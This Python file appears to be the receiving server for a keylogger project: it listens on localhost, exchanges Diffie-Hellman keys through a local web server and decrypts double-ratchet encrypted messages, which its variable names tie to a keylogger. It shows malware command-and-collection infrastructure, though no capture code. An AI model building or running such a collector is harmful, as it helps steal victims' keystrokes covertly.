#!/usr/bin/env python3
import socket
import threading as t
from datetime import datetime
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
import double_ratchet
import subprocess


# Global variables
HEADER_LENGTH = 24
HOSTNAME = "localhost"
SERVERPORT = 8080
KEYLOGGER_HOSTNAME = "localhost"
KEYLOGGER_PORT = 8081


def start(hostname, serverPort):
    subprocess.run(["python3", "-m", "http.server", str(serverPort), "--bind", hostname])


class Server:

    def __init__(self, ip, port):
        self.__server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.__server_socket.bind((ip, port))
        self.__client = None
        self.__r = double_ratchet.Ratchet()
        self.__peer_key = None
        msg = f'\nPython3 Server started on {socket.gethostname()} at {datetime.now().strftime("%H:%M:%S %b-%d-%Y")}.\n\nListening for connections on {ip}:{port}...\n\n'
        print(msg)

    def exit(self):
        self.__client[0].close()
        self.__server_socket.close()
        print("\nClosing server...")

    def __pair_pkey(self, data):
        pubkey = data.split(b'\n-----END PUBLIC KEY-----')[0] + b'\n-----END PUBLIC KEY-----'
        dhpublica: dh.DHPublicKey = serialization.load_pem_public_key(pubkey, backend=default_backend())
        self.__r.pairComm(dhpublica)
        self.__peer_key = pubkey

    def __receive_message(self, client_socket):
        try:
            # receive our "header" containing message length, it's size is defined and constant
            message_header = client_socket.recv(HEADER_LENGTH)
            if not len(message_header):
                return
            # receive a new pairing key
            if self.__peer_key is None:
                message_length = int(message_header.decode('utf-8').strip())
                data = client_socket.recv(message_length)
                self.__pair_pkey(data)
            # receive a new message
            else:
                message_length = int(message_header.decode('utf-8').strip())
                return {'header': message_header, 'data': client_socket.recv(message_length)}
        except Exception:
            return False

    def __write_message(self, msg):
        #open a file in web root and write the next key
        with open('message.txt', 'w') as f:
            f.write(msg)
    
    def __handle_close(self, username):
        log = f"Closed connection from: {username}"
        print(log)
        self.__client = None
        self.__r = double_ratchet.Ratchet()
        self.__peer_key = None
        subprocess.run(["rm", "message.txt"])


    def start(self):
        try:
            # start web server
            t.Thread(target=start, args=(HOSTNAME, SERVERPORT)).start()
            # start listening for incomming connections
            self.__server_socket.listen()
            while True:
                if self.__client is None:
                    # accept new connection
                    self.__client = self.__server_socket.accept()
                    # receive new pairing key
                    self.__receive_message(self.__client[0])
                    address = str(self.__client[1]).replace('(', '').replace(')', '').replace(',', ':').replace('\'', '')
                    print('Pairing key received from '+address+'.')
                    # send own pairing key
                    self.__write_message(self.__r.getPublicKey().decode('utf-8'))
                else:
                    username = self.__client[1]
                    message = self.__receive_message(self.__client[0])
                    if message is None:
                        continue
                    elif message is False:
                        self.__handle_close(username)
                        continue
                    elif self.__peer_key is None:
                        # update the current pairing key for ratchet
                        self.__pair_pkey(message["data"])
                        # update servers pairing key
                        self.__write_message(self.__r.getPublicKey().decode('utf-8'))
                    else:
                        # decrypt message
                        try:
                            msg = self.__r.decrypt(message["data"])
                            msg = f'Received message from {username}: {msg}'
                            print(msg)
                            self.__peer_key = None
                            self.__r.updateDH()
                            self.__write_message(self.__r.getPublicKey().decode('utf-8'))
                        except Exception:
                            self.__handle_close(username)
        except KeyboardInterrupt:
            self.exit()


server = Server(KEYLOGGER_HOSTNAME, KEYLOGGER_PORT)
server.start()